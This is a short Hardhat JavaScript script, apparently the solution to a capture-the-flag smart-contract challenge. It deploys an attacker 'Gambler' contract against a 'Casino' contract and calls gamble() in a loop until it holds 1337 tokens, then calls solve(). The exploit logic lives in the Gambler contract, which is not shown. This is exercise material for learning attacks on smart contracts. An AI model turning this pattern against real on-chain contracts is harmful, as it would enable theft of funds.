const { ethers } = require('hardhat');

async function main() {
  const [attackerAcc] = await ethers.getSigners();
  const casino = await ethers.getContractAt("Casino", "0x6189762f79de311B49a7100e373bAA97dc3F4bd0");
  const ducoin = await ethers.getContractAt("DUCoin", "0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8");

  const Gambler = await ethers.getContractFactory("Gambler", attackerAcc);
  console.log("Deploying Gambler...");
  const gambler = await Gambler.deploy(ducoin.address, casino.address);
  await gambler.deployed();
  // const gambler = await ethers.getContractAt("Gambler", "0x83C2E31934001069B10434910eeFaBB0ed15Fe2B")
  console.log("gambler deployed to:", gambler.address);
  
  let gamblerBalance = await casino.balances(gambler.address);
  const targetGamblerBalance = 1337;

  while(gamblerBalance.lt(targetGamblerBalance)) {
    console.log({ gamblerBalance });
    const gambleTx = await gambler.connect(attackerAcc).gamble();
    await gambleTx.wait();
    gamblerBalance = await casino.balances(gambler.address);
  }
  const winTx = await gambler.connect(attackerAcc).solve();
  await winTx.wait();
  console.log("solved :)");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
